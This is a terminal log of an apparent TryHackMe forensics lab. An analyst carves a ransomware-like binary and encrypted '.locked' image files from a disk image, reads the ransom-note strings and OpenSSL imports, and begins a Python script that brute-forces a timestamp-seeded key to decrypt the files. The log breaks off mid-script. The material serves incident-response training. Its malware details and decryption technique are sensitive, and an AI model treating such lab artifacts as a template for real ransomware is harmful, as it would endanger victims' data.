+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 $IMG 84697 > system_old.journal[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 $IMG 84697 > system_old.journal
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mjournalctl --file=./system.journal --no-pager | grep -iE "gallery|export|indexd|curl|wget|chmo[27m[7md[27m[7m" | head -60[27m[A]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ journalctl --file=./system.journal --no-pager | grep -iE "gallery|export|indexd|curl|wget|chmod" | head -60
+[?2004lOct 19 05:26:18 gallery systemd-timesyncd[506]: Contacted time server 91.189.91.157:123 (ntp.ubuntu.com).
+Oct 19 05:26:18 gallery systemd-journald[313]: Time jumped backwards, rotating.
+Oct 19 05:26:18 gallery systemd-resolved[502]: Clock change detected. Flushing caches.
+Oct 19 05:26:18 gallery systemd-timesyncd[506]: Initial clock synchronization to Mon 2026-10-19 05:26:18.558706 UTC.
+Oct 19 05:26:19 gallery systemd-networkd[676]: enp0s2: Gained IPv6LL
+Oct 19 05:26:19 gallery systemd[1]: Finished systemd-networkd-wait-online.service - Wait for Network to be Configured.
+Oct 19 05:26:19 gallery systemd[1]: Starting cloud-init.service - Cloud-init: Network Stage...
+Oct 19 05:26:21 gallery cloud-init[687]: Cloud-init v. 26.1-0ubuntu1~24.04.1 running 'init' at Mon, 19 Oct 2026 05:26:21 +0000. Up 30.71 seconds.
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: ++++++++++++++++++++++++++++++++++++++Net device info++++++++++++++++++++++++++++++++++++++
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: +--------+------+----------------------------+---------------+--------+-------------------+
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: | Device |  Up  |          Address           |      Mask     | Scope  |     Hw-Address    |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: +--------+------+----------------------------+---------------+--------+-------------------+
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: | enp0s2 | True |         10.0.2.15          | 255.255.255.0 | global | 52:54:00:12:34:56 |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: | enp0s2 | True | fec0::5054:ff:fe12:3456/64 |       .       |  site  | 52:54:00:12:34:56 |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: | enp0s2 | True | fe80::5054:ff:fe12:3456/64 |       .       |  link  | 52:54:00:12:34:56 |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: |   lo   | True |         127.0.0.1          |   255.0.0.0   |  host  |         .         |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: |   lo   | True |          ::1/128           |       .       |  host  |         .         |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: +--------+------+----------------------------+---------------+--------+-------------------+
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: ++++++++++++++++++++++++++++Route IPv4 info+++++++++++++++++++++++++++++
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: +-------+-------------+----------+-----------------+-----------+-------+
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: | Route | Destination | Gateway  |     Genmask     | Interface | Flags |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: +-------+-------------+----------+-----------------+-----------+-------+
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: |   0   |   0.0.0.0   | 10.0.2.2 |     0.0.0.0     |   enp0s2  |   UG  |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: |   1   |   10.0.2.0  | 0.0.0.0  |  255.255.255.0  |   enp0s2  |   U   |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: |   2   |   10.0.2.2  | 0.0.0.0  | 255.255.255.255 |   enp0s2  |   UH  |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: |   3   |   10.0.2.3  | 0.0.0.0  | 255.255.255.255 |   enp0s2  |   UH  |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: +-------+-------------+----------+-----------------+-----------+-------+
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: +++++++++++++++++++Route IPv6 info+++++++++++++++++++
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: +-------+-------------+---------+-----------+-------+
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: | Route | Destination | Gateway | Interface | Flags |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: +-------+-------------+---------+-----------+-------+
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: |   0   |  fe80::/64  |    ::   |   enp0s2  |   U   |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: |   1   |  fec0::/64  |    ::   |   enp0s2  |   Ue  |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: |   2   |     ::/0    | fe80::2 |   enp0s2  |  UGe  |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: |   4   |    local    |    ::   |   enp0s2  |   U   |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: |   5   |  multicast  |    ::   |   enp0s2  |   U   |
+Oct 19 05:26:22 gallery cloud-init[687]: ci-info: +-------+-------------+---------+-----------+-------+
+Oct 19 05:26:23 gallery kernel: EXT4-fs (vda1): resizing filesystem from 655099 to 2883323 blocks
+Oct 19 05:26:24 gallery kernel: EXT4-fs (vda1): resized filesystem to 2883323
+Oct 19 05:26:24 gallery useradd[759]: new group: name=ubuntu, GID=1000
+Oct 19 05:26:24 gallery useradd[759]: new user: name=ubuntu, UID=1000, GID=1000, home=/home/ubuntu, shell=/bin/bash, from=none
+Oct 19 05:26:24 gallery useradd[759]: add 'ubuntu' to group 'adm'
+Oct 19 05:26:24 gallery useradd[759]: add 'ubuntu' to group 'cdrom'
+Oct 19 05:26:24 gallery useradd[759]: add 'ubuntu' to group 'sudo'
+Oct 19 05:26:24 gallery useradd[759]: add 'ubuntu' to group 'dip'
+Oct 19 05:26:24 gallery useradd[759]: add 'ubuntu' to group 'lxd'
+Oct 19 05:26:24 gallery useradd[759]: add 'ubuntu' to shadow group 'adm'
+Oct 19 05:26:24 gallery useradd[759]: add 'ubuntu' to shadow group 'cdrom'
+Oct 19 05:26:24 gallery useradd[759]: add 'ubuntu' to shadow group 'sudo'
+Oct 19 05:26:24 gallery useradd[759]: add 'ubuntu' to shadow group 'dip'
+Oct 19 05:26:24 gallery useradd[759]: add 'ubuntu' to shadow group 'lxd'
+Oct 19 05:26:24 gallery passwd[767]: password for 'ubuntu' changed by 'root'
+Oct 19 05:26:26 gallery cloud-init[687]: Generating public/private rsa key pair.
+Oct 19 05:26:26 gallery cloud-init[687]: Your identification has been saved in /etc/ssh/ssh_host_rsa_key
+Oct 19 05:26:26 gallery cloud-init[687]: Your public key has been saved in /etc/ssh/ssh_host_rsa_key.pub
+Oct 19 05:26:26 gallery cloud-init[687]: The key fingerprint is:
+Oct 19 05:26:26 gallery cloud-init[687]: SHA256:HUQ1ICgUjtlzsGdi1qcD3gmOzUoLMQddE7GjgSwB4HI root@gallery
+Oct 19 05:26:26 gallery cloud-init[687]: The key's randomart image is:
+Oct 19 05:26:26 gallery cloud-init[687]: +---[RSA 3072]----+
+Oct 19 05:26:26 gallery cloud-init[687]: |B. oO+ ...+oo    |
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mjournalctl --file=./system_old.journal --no-pager | grep -iE "gallery|export|indexd|curl|wget|[27m[7mc[27m[7mhmod" | head -60[27m[A]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ journalctl --file=./system_old.journal --no-pager | grep -iE "gallery|export|indexd|curl|wget|chmod" | head -60
+[?2004lOct 19 05:26:01 ubuntu systemd[1]: systemd 255.4-1ubuntu8.18 running in system mode (+PAM +AUDIT +SELINUX +APPARMOR +IMA +SMACK +SECCOMP +GCRYPT -GNUTLS +OPENSSL +ACL +BLKID +CURL +ELFUTILS +FIDO2 +IDN2 -IDN +IPTC +KMOD +LIBCRYPTSETUP +LIBFDISK +PCRE2 -PWQUALITY +P11KIT +QRENCODE +TPM2 +BZIP2 +LZ4 +XZ +ZLIB +ZSTD -BPF_FRAMEWORK -XKBCOMMON +UTMP +SYSVINIT default-hierarchy=unified)
+Oct 19 05:26:14 gallery systemd-resolved[502]: System hostname changed to 'gallery'.
+Oct 19 05:26:14 gallery systemd[1]: Finished apparmor.service - Load AppArmor profiles.
+Oct 19 05:26:14 gallery systemd[1]: Starting snapd.apparmor.service - Load AppArmor profiles managed internally by snapd...
+Oct 19 05:26:14 gallery snapd-apparmor[621]: main.go:143: No profiles to load
+Oct 19 05:26:14 gallery systemd[1]: Finished snapd.apparmor.service - Load AppArmor profiles managed internally by snapd.
+Oct 19 05:26:16 gallery systemd[1]: netplan-ovs-cleanup.service - OpenVSwitch configuration for cleanup was skipped because of an unmet condition check (ConditionFileIsExecutable=/usr/bin/ovs-vsctl).
+Oct 19 05:26:16 gallery systemd[1]: netplan-ovs-cleanup.service - OpenVSwitch configuration for cleanup was skipped because of an unmet condition check (ConditionFileIsExecutable=/usr/bin/ovs-vsctl).
+Oct 19 05:26:16 gallery systemd[1]: netplan-ovs-cleanup.service - OpenVSwitch configuration for cleanup was skipped because of an unmet condition check (ConditionFileIsExecutable=/usr/bin/ovs-vsctl).
+Oct 19 05:26:16 gallery systemd[1]: Reloading requested from client PID 639 ('systemctl') (unit cloud-init-local.service)...
+Oct 19 05:26:16 gallery systemd[1]: Reloading...
+Oct 19 05:26:18 gallery systemd[1]: Reloading finished in 1850 ms.
+Oct 19 05:26:19 gallery systemd[1]: Finished cloud-init-local.service - Cloud-init: Local Stage (pre-network).
+Oct 19 05:26:19 gallery systemd[1]: Reached target network-pre.target - Preparation for Network.
+Oct 19 05:26:19 gallery systemd[1]: Starting systemd-networkd.service - Network Configuration...
+Oct 19 05:26:19 gallery systemd-networkd[676]: lo: Link UP
+Oct 19 05:26:19 gallery systemd-networkd[676]: lo: Gained carrier
+Oct 19 05:26:19 gallery systemd-networkd[676]: Enumeration completed
+Oct 19 05:26:19 gallery systemd[1]: Started systemd-networkd.service - Network Configuration.
+Oct 19 05:26:19 gallery systemd[1]: Reached target network.target - Network.
+Oct 19 05:26:19 gallery systemd-networkd[676]: enp0s2: Configuring with /run/systemd/network/10-netplan-enp0s2.network.
+Oct 19 05:26:19 gallery systemd[1]: Starting systemd-networkd-wait-online.service - Wait for Network to be Configured...
+Oct 19 05:26:19 gallery systemd-networkd[676]: enp0s2: Link UP
+Oct 19 05:26:19 gallery systemd-networkd[676]: enp0s2: Gained carrier
+Oct 19 05:26:19 gallery systemd-networkd[676]: enp0s2: DHCPv4 address 10.0.2.15/24, gateway 10.0.2.2 acquired from 10.0.2.2
+Oct 19 05:26:19 gallery systemd-timesyncd[506]: Network configuration changed, trying to establish connection.
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 $IMG 263212 > indexd.bin[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 $IMG 263212 > indexd.bin
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mfile indexd.bin[27mfile indexd.bin
+[?2004lindexd.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f8f0e4efdd56a53819f0b57035bf9483ef3cf96f, for GNU/Linux 3.2.0, stripped
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7msha256sum indexd.bin[27msha256sum indexd.bin
+[?2004l6a0e5b25a919a94952b34e38d8e8b595036d1ef6a026bf5cca38a0d34459102f  indexd.bin
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mistat -o 2099200 $IMG 263212[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cistat -o 2099200 $IMG 263212
+[?2004linode: 263212
+Allocated
+Group: 16
+Generation Id: 2907542858
+uid / gid: 999 / 988
+mode: rrwx------
+Flags: Extents, 
+size: 14552
+num of links: 1
+
+Inode Times:
+Accessed:	2026-10-20 05:36:54.655547730 (UTC)
+File Modified:	2026-10-20 05:36:54.640548120 (UTC)
+Inode Modified:	2026-10-20 05:36:54.652547808 (UTC)
+File Created:	2026-10-20 05:36:54.638548172 (UTC)
+
+Direct Blocks:
+310659 310660 310661 310662 
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mcd ~/work[27mcd ~/work
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mreadelf -d indexd.bin | grep NEEDED[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Creadelf -d indexd.bin | grep NEEDED
+[?2004l 0x0000000000000001 ([01;31m[KNEEDED[m[K)             Shared library: [libcrypto.so.3]
+ 0x0000000000000001 ([01;31m[KNEEDED[m[K)             Shared library: [libc.so.6]
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mreadelf -h indexd.bin | grep Entry[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Creadelf -h indexd.bin | grep Entry
+[?2004l  [01;31m[KEntry[m[K point address:               0x1420
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mstrings -n 4 indexd.bin | less[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cstrings -n 4 indexd.bin | less
+[?2004l[?1049h[22;0;0t[?1h=/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+_ITM_deregisterTMCloneTable
+_ITM_registerTMCloneTable
+EVP_EncryptUpdate
+EVP_CIPHER_CTX_ctrl
+EVP_EncryptInit_ex
+RAND_bytes
+OPENSSL_cleanse
+EVP_CIPHER_CTX_new
+EVP_aes_256_gcm
+EVP_CIPHER_CTX_free
+EVP_EncryptFinal_ex
+gethostname
+clock_gettime
+__stack_chk_fail
+__printf_chk
+fstatat
+futimens
+ftruncate
+open
+malloc
+__libc_start_main
+renameat2
+pwrite
+__cxa_finalize
+openat
+calloc
+:[K[Kfsync
+:[K[Kclose
+:[K[K__snprintf_chk
+:[K[K__pread_chk
+:[K[Kstrcmp
+:[K[Kfstat
+:[K[Kgeteuid
+:[K[Klibcrypto.so.3
+:[K[Klibc.so.6
+:[K[KOPENSSL_3.0.0
+:[K[KGLIBC_2.6
+:[K[KGLIBC_2.34
+:[K[KGLIBC_2.4
+:[K[KGLIBC_2.3.4
+:[K[KGLIBC_2.33
+:[K[KGLIBC_2.17
+:[K[KGLIBC_2.28
+:[K[KGLIBC_2.2.5
+:[K[KPTE1
+:[K[Ku+UH
+:[K[KAWAVAUATUSH
+:[K[KD$h%
+:[K[K44M)
+:[K[KGPH1A
+:[K[KT$,A
+:[K[KT$(I
+:[K[KT$,HcD$(I
+:[K[KD$(H
+:[K[K)D$0
+:[K[K)L$@H
+:[K[K[]A\A]A^A_
+:[K[KAVAUATUSH
+:[K[K[]A\A]A^
+:[K[KD$8%
+:[K[KD$PH
+:[K[KHiL$
+:[K[K%s.locked
+:[K[Kgallery
+:[K[K/srv/gallery/media/originals
+:[K[Kyard_0147.jpg
+:[K[Kyard_0148.jpg
+:[K[Kyard_0152.jpg
+:[K[KRESTORE.txt
+:[K[Kprocessed=%u
+:[K[KYour image library has been locked.
+:[K[KKeep the affected files and their names unchanged.
+:[K[KFor recovery instructions contact restore@notice.invalid.
+:[K[K9*3$"
+:[K[KGCC: (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0
+:[K[K.shstrtab
+:[K[K.interp
+:[K[K.note.gnu.property
+:[K[K.note.gnu.build-id
+:[K[K.note.ABI-tag
+:[K[K.gnu.hash
+:[K[K.dynsym
+:[K[K.dynstr
+:[K[K.gnu.version
+:[K[K.gnu.version_r
+:[K[K.rela.dyn
+:[K[K.rela.plt
+:[K[K.init
+:[K[K.plt.got
+:[K[K.plt.sec
+:[K[K.text
+:[K[K.fini
+:[K[K.rodata
+:[K[K.eh_frame_hdr
+:[K[K.eh_frame
+:[K[K.init_array
+:[K[K.fini_array
+:[K[K.data.rel.ro
+:[K[K.dynamic
+:[K[K.data
+:[K[K.bss
+:[K[K.comment
+:[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[K[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ strings -n 4 indexd.bin | less[K[K[K[K[K[K[K
+[?2004l/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+_ITM_deregisterTMCloneTable
+_ITM_registerTMCloneTable
+EVP_EncryptUpdate
+EVP_CIPHER_CTX_ctrl
+EVP_EncryptInit_ex
+RAND_bytes
+OPENSSL_cleanse
+EVP_CIPHER_CTX_new
+EVP_aes_256_gcm
+EVP_CIPHER_CTX_free
+EVP_EncryptFinal_ex
+gethostname
+clock_gettime
+__stack_chk_fail
+__printf_chk
+fstatat
+futimens
+ftruncate
+open
+malloc
+__libc_start_main
+renameat2
+pwrite
+__cxa_finalize
+openat
+calloc
+fsync
+close
+__snprintf_chk
+__pread_chk
+strcmp
+fstat
+geteuid
+libcrypto.so.3
+libc.so.6
+OPENSSL_3.0.0
+GLIBC_2.6
+GLIBC_2.34
+GLIBC_2.4
+GLIBC_2.3.4
+GLIBC_2.33
+GLIBC_2.17
+GLIBC_2.28
+GLIBC_2.2.5
+PTE1
+u+UH
+AWAVAUATUSH
+D$h%
+44M)
+GPH1A
+T$,A
+T$(I
+T$,HcD$(I
+D$(H
+)D$0
+)L$@H
+[]A\A]A^A_
+AVAUATUSH
+[]A\A]A^
+D$8%
+D$PH
+HiL$
+%s.locked
+gallery
+/srv/gallery/media/originals
+yard_0147.jpg
+yard_0148.jpg
+yard_0152.jpg
+RESTORE.txt
+processed=%u
+Your image library has been locked.
+Keep the affected files and their names unchanged.
+For recovery instructions contact restore@notice.invalid.
+9*3$"
+GCC: (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.data.rel.ro
+.dynamic
+.data
+.bss
+.comment
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mobjdump -T indexd.bin | grep -iE "EVP|SHA|MD5|PKCS|RAND|rand|crypt"[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cobjdump -T indexd.bin | grep -iE "EVP|SHA|MD5|PKCS|RAND|rand|crypt"
+[?2004l0000000000000000      DF *UND*	0000000000000000 (OPENSSL_3.0.0) [01;31m[KEVP[m[K_En[01;31m[Kcrypt[m[KFinal_ex
+0000000000000000      DF *UND*	0000000000000000 (OPENSSL_3.0.0) [01;31m[KEVP[m[K_aes_256_gcm
+0000000000000000      DF *UND*	0000000000000000 (OPENSSL_3.0.0) [01;31m[KEVP[m[K_CIPHER_CTX_ctrl
+0000000000000000      DF *UND*	0000000000000000 (OPENSSL_3.0.0) [01;31m[KEVP[m[K_CIPHER_CTX_free
+0000000000000000      DF *UND*	0000000000000000 (OPENSSL_3.0.0) [01;31m[KRAND[m[K_bytes
+0000000000000000      DF *UND*	0000000000000000 (OPENSSL_3.0.0) [01;31m[KEVP[m[K_CIPHER_CTX_new
+0000000000000000      DF *UND*	0000000000000000 (OPENSSL_3.0.0) [01;31m[KEVP[m[K_En[01;31m[Kcrypt[m[KInit_ex
+0000000000000000      DF *UND*	0000000000000000 (OPENSSL_3.0.0) [01;31m[KEVP[m[K_En[01;31m[Kcrypt[m[KUpdate
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mstrings -n 8 indexd.bin | grep -iE "aes|seed|key|salt|lock|magic"[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cstrings -n 8 indexd.bin | grep -iE "aes|seed|key|salt|lock|magic"
+[?2004lEVP_[01;31m[Kaes[m[K_256_gcm
+c[01;31m[Klock[m[K_gettime
+%s.[01;31m[Klock[m[Ked
+Your image library has been [01;31m[Klock[m[Ked.
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mIMG=~/Desktop/artifacts/disk.img[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[CIMG=~/Desktop/artifacts/disk.img
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 $IMG 263210 > yard_0152.jpg.locked[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 $IMG 263210 > yard_0152.jpg.locked
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 $IMG 262186 > yard_0147.jpg.locked[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 $IMG 262186 > yard_0147.jpg.locked
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 $IMG 263208 > yard_0148.jpg.locked[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 $IMG 263208 > yard_0148.jpg.locked
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mls -l *.locked[27mls -l *.locked
+[?2004l-rw-rw-r-- 1 ubuntu ubuntu 278658 Oct 22 23:47 yard_0147.jpg.locked
+-rw-rw-r-- 1 ubuntu ubuntu 418188 Oct 22 23:47 yard_0148.jpg.locked
+-rw-rw-r-- 1 ubuntu ubuntu 180731 Oct 22 23:47 yard_0152.jpg.locked
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mxxd yard_0147.jpg.locked | head -8[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cxxd yard_0147.jpg.locked | head -8
+[?2004l00000000: 4750 4831 0100 0000 5240 0400 0000 0000  GPH1....R@......
+00000010: 0ae5 ada4 7933 ecc9 c1d3 4d06 6682 366e  ....y3....M.f.6n
+00000020: 919b 3e02 7927 d4e4 59fa 686a 0000 0000  ..>.y'..Y.hj....
+00000030: d1ae 6a22 ebe2 4fd8 142c efcd 0697 256d  ..j"..O..,....%m
+00000040: 9232 6d0f 0578 e96e 77dd 8231 6dc4 6ec2  .2m..x.nw..1m.n.
+00000050: b946 dfad f6b5 3aca 1f7d e288 70e4 66fa  .F....:..}..p.f.
+00000060: ed0d ebb5 7f2c c727 c7f5 6914 0c67 ae41  .....,.'..i..g.A
+00000070: 7c03 3343 8372 e453 0071 5fcd 724d 0455  |.3C.r.S.q_.rM.U
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mxxd yard_0147.jpg.locked | tail -4[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cxxd yard_0147.jpg.locked | tail -4
+[?2004l00044050: 2849 e53e 5dfa b014 f5da f98d ccb9 eec5  (I.>]...........
+00044060: cce8 1723 b2c1 21dc 2d7f 796d 53a9 148b  ...#..!.-.ymS...
+00044070: 8fe7 47c2 ab2b 137d 25ee 0404 5ea8 ec99  ..G..+.}%...^...
+00044080: 5849                                     XI
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 $IMG 262187 > exp1.tar[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 $IMG 262187 > exp1.tar
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 $IMG 263209 > exp2.tar[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 $IMG 263209 > exp2.tar
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7micat -o 2099200 $IMG 263211 > exp3.tar[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cicat -o 2099200 $IMG 263211 > exp3.tar
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mfor t in exp*.tar; do echo $t; tar -tvf $t; done[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cfor t in exp*.tar; do echo $t; tar -tvf $t; done
+[?2004lexp1.tar
+-rw-r----- gallery/gallery 278610 2026-10-20 05:36 yard_0147.jpg
+exp2.tar
+drwxr-xr-x gallery/gallery   0 2026-10-20 05:36 ./
+-rw-r----- gallery/gallery 418140 2026-10-20 05:36 ./yard_0148.jpg
+-rw-r----- gallery/gallery 278610 2026-10-20 05:36 ./yard_0147.jpg
+exp3.tar
+-rw-r----- gallery/gallery 278610 2026-10-20 05:36 yard_0147.jpg
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ ls
+[?2004lRESTORE.txt  [0m[01;31mexp1.tar[0m  gallery.env      indexd.bin          yard_0147.jpg.locked
+access.log   [01;31mexp2.tar[0m  gallery.py       system.journal      yard_0148.jpg.locked
+[01;34mdb[0m           [01;31mexp3.tar[0m  gallery.service  system_old.journal  yard_0152.jpg.locked
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ [7mdate -u -d "2026-10-20 05:36:54" +%s[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cdate -u -d "2026-10-20 05:36:54" +%s
+[?2004l1792474614
+[?2004h]0;ubuntu@tryhackme: ~/work[01;32mubuntu@tryhackme[00m:[01;34m~/work[00m$ cat << EOF > ./crack.py
+import struct, os
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+M = (1 << 64) - 1
+def splitmix_key(seed):
+    s = seed
+    out = b""
+    for _ in range(4):
+        s = (s + 0x9e3779b97f4a7c15) & M
+        z = s
+        z = ((z ^ (z >> 30)) * 0xbf58476d1ce4e5b9) & M
+        z = ((z ^ (z >> 27)) * 0x94d049bb133111eb) & M
+        z = z ^ (z >> 31)
+        out += struct.pack("<Q", z)
+    return out
+
+def parse(path):
+    d = open(path, "rb").read()
+    assert d[:4] == b"GPH1"
+[7m    return d[:0x1c], d[0x10:0x1c], d[0x1c:0x2c], d[0x30:][27m
+
+[7maad, nonce, tag, ct = parse("yard_0147.jpg.locked")[27m
+
+[7m# fast pre-check: first keystream block (GCM counter starts at 2) must give JPEG magic[27m
+[7mctr_iv = nonce + (2).to_bytes(4, "big")[27m
+[7mfound = None[27m
+[7mfor seed in range(1792474614000, 1792474640000):[27m
